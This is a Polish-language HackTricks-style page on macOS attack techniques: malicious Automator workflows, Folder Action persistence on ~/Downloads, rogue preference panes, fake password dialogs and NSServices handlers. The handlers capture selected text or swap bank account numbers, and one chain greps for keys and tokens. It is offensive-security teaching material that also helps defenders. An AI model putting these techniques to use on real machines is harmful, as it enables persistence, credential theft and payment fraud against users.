# Abuse Automator, Preference Panes i NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions i Workflows

### Podstawowe informacje

**Automator** to wizualne narzędzie macOS do automatyzacji. Wykonuje **workflows** (bundles `.workflow`) składające się z **actions** (bundles `.action`). Automator obsługuje również integrację z **Folder Actions**, **Quick Actions** i **Shortcuts**. W nowszych wersjach macOS workflows można także **importować do Shortcuts**, dzięki czemu ta sama złośliwa logika może pojawić się jako Quick Action w Finderze, usługa użytkownika w `~/Library/Services/` lub shortcut korzystający ze starszych Automator actions.

Automator actions to **plugins** ładowane do środowiska uruchomieniowego Automatora podczas wykonywania workflow. Mogą:
- Wykonywać dowolne shell scripts
- Przetwarzać pliki i dane
- Komunikować się z aplikacjami za pomocą AppleScript
- Łączyć się w celu tworzenia złożonej automatyzacji

### Dlaczego ma to znaczenie

> [!WARNING]
> Automator workflows można nakłonić do uruchomienia za pomocą **social engineeringu** — wyglądają jak zwykłe pliki dokumentów. Bundle `.workflow` może zawierać osadzone polecenia powłoki, które są wykonywane podczas uruchamiania workflow. W połączeniu z Folder Actions zapewniają **automatyczną persistence** uruchamianą przez zdarzenia dotyczące plików. Ostatnie poprawki w Gatekeeperze wykazały również, że **Quick Actions dołączone do aplikacji** (`Contents/PlugIns/*.workflow`) należy traktować jako wykonywalną zawartość, a nie nieszkodliwe dane.

### Rozpoznanie
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Pakiet `.workflow` wygląda dla większości użytkowników jak zwykły plik dokumentu:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Atak: Persistence za pomocą Folder Actions

Folder Actions automatycznie wykonują workflow, gdy pliki zostaną dodane do monitorowanego folderu:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions utrzymują się po ponownym uruchomieniu systemu i wykonują się po cichu. Folder Action dla `~/Downloads` oznacza, że **każdy pobrany plik uruchamia Twój payload** — w tym pliki pobrane z Safari i Chrome, przesłane przez AirDrop oraz załączniki wiadomości e-mail. Należy również pamiętać, że `System Events` może rejestrować Folder Actions wskazujące na skrypty poza domyślnymi lokalizacjami `~/Library/Scripts/Folder Action Scripts`, dlatego warto szukać również luźnych ścieżek. Informacje o powiązanych konsekwencjach dotyczących TCC znajdziesz na [stronie TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Podstawowe informacje

Preference panes (bundles `.prefPane`) to pluginy ładowane przez **System Settings** (wcześniej System Preferences). Udostępniają panele interfejsu konfiguracji dla funkcji systemowych lub funkcji firm trzecich. W starszych systemach były ładowane bezpośrednio przez `System Preferences`; w nowszych wydaniach panes firm trzecich są zwykle obsługiwane przez **legacy loader XPC service** uruchamiany z poziomu System Settings.

### Dlaczego ma to znaczenie

- Preference panes wykonują się w **zaufanym procesie hosta** uruchamianym przez System Settings / System Preferences
- We współczesnych systemach hostem może być **`legacyLoader` XPC service**, dlatego istotna granica nadal przebiega między **zaufanym procesem interfejsu Apple a ładowaniem kodu firm trzecich**
- Preference panes firm trzecich dziedziczą **kontekst bezpieczeństwa procesu hosta** oraz zaufanie użytkownika związane z tym interfejsem
- Użytkownicy instalują preference panes przez **dwukrotne kliknięcie** — co ułatwia social engineering
- Po zainstalowaniu **utrzymują się** i są ładowane za każdym razem, gdy System Settings otwiera ten panel

### Odkrywanie
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Złośliwy panel preferencji dziedziczy kontekst bezpieczeństwa **hosta panelu** (historycznie `System Preferences`, a w nowszych wersjach często pomocniczy proces `legacyLoader` uruchamiany przez `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attack: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Atak: UI Phishing

Panel preferencji może naśladować legalne panele systemowego UI, aby **wyłudzać dane uwierzytelniające**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Podstawowe informacje

**NSServices** umożliwiają aplikacjom udostępnianie funkcjonalności innym aplikacjom za pośrednictwem **Services menu** (prawy przycisk myszy → Services). Gdy użytkownik zaznaczy tekst lub dane i wywoła usługę, zaznaczone dane są **wysyłane do dostawcy usługi** w celu przetworzenia.

Usługi są deklarowane w `Info.plist` aplikacji pod kluczem `NSServices` i rejestrowane w pasteboard server (`pbs`). macOS przechowuje również **service cache** oraz **restriction policy**, które decydują o tym, które usługi są widoczne i czy wywołujący działający w sandboxie powinien otrzymać dodatkowe ostrzeżenie.

### Dlaczego ma to znaczenie

- Usługi otrzymują **cross-application data flow** — zaznaczony tekst z dowolnej aplikacji jest wysyłany do usługi
- Złośliwa usługa przechwytuje dane z password managerów, klientów poczty e-mail i aplikacji finansowych
- Usługi mogą **zwracać zmodyfikowane dane** do wywołującej aplikacji (man-in-the-middle podczas operacji na zaznaczeniu)
- Nazwy usług mogą być skonstruowane tak, aby wyglądały na wiarygodne („Format Text”, „Encrypt Selection”, „Share”)
- Opcjonalna flaga `NSRestricted` ma znaczenie dla bezpieczeństwa: usługa oznaczona jako unrestricted może być wywoływana przez aplikację działającą w sandboxie bez ostrzeżenia wyświetlanego przez macOS dla usług, które mogą ułatwiać escape<sup>[2]</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Atak: Usługa przechwytywania danych
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Atak: Modyfikacja danych (Man-in-the-Middle)

Usługa może **modyfikować zwracane dane**, sprawiając wrażenie, że zapewnia prawidłową funkcję:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Ograniczone usługi i współczesne nadużycia

Apple obsługuje opcjonalną wartość logiczną `NSRestricted` dla każdej definicji usługi. Jeśli jest ustawiona, macOS ostrzega wywołujących działających w sandboxie, ponieważ usługa może pomóc im **opuścić granice sandboxa lub prywatności**. Z perspektywy ofensywnej daje to dwie przydatne ścieżki audytu:

- Szukaj **usług firm trzecich, które nie są oznaczone jako restricted**, mimo że pośredniczą w Apple Events, dostępie do plików lub innych uprzywilejowanych działaniach
- Szukaj **wbudowanych usług o wysokiej wartości** z silnymi uprawnieniami (na przykład usług udostępnianych przez Script Editor lub helpery oparte na Finderze) i sprawdzaj, czy interakcja użytkownika wystarczy, aby przekształcić je w primitive umożliwiające dostęp do danych

Dobrym nowszym przykładem jest **CVE-2022-48574**, w którym mechanizm Services mógł zostać wykorzystany do uzyskania dostępu do **plików użytkownika chronionych przez TCC bez oczekiwanego procesu potwierdzenia**. Błąd został naprawiony, ale technika nadal jest przydatna w threat modeling: każda usługa, która przekazuje żądania dostępu do plików lub automatyzacji w imieniu wywołującego, zasługuje na taką samą analizę.<sup>[2]</sup>

---

## Nowsze informacje dotyczące bezpieczeństwa

- **Quick Actions to wykonywalna zawartość**: Apple naprawiło w 2024 roku obejście Gatekeeper, w którym Quick Action Automatora dołączona do aplikacji mogła zostać uruchomiona bez standardowej oceny. Podczas audytu aplikacji sprawdzaj `Contents/PlugIns/*.workflow/Contents/document.wflow` dokładnie tak, jak sprawdzałbyś helper scripts lub login items. Zobacz [stronę Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
- **Shortcuts mogą dziedziczyć starsze zachowanie Automatora**: Apple dodało również dodatkowy prompt o zgodę użytkownika po wykryciu, że shortcuts firm trzecich używały **legacy Automator action** do wysyłania Apple Events bez oczekiwanego procesu uzyskiwania uprawnień. Zaimportowane workflows i shortcut bundles powinny być sprawdzane pod kątem `Run AppleScript`, `Run Shell Script` oraz podobnych bridge actions. Zobacz [stronę TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator nadal stanowi aktywną granicę prywatności**: Apple wydało kolejną poprawkę Automatora w 2025 roku dotyczącą dostępu do chronionych danych użytkownika. Nawet jeśli Automator jest legacy surface, traktuj każdy workflow runner, host Quick Action lub automation bridge jako aktualną attack surface, a nie martwy kod.

---

## Łańcuchy ataków obejmujące różne techniki

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panel preferencji → Eskalacja TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Kradzież haseł z menedżera haseł
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Odwołania

- [1] [Apple — Informacje o zawartości zabezpieczeń systemów macOS Ventura 13.7, Sonoma 14.7 i Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Jak działał exploit NSServices w systemie macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
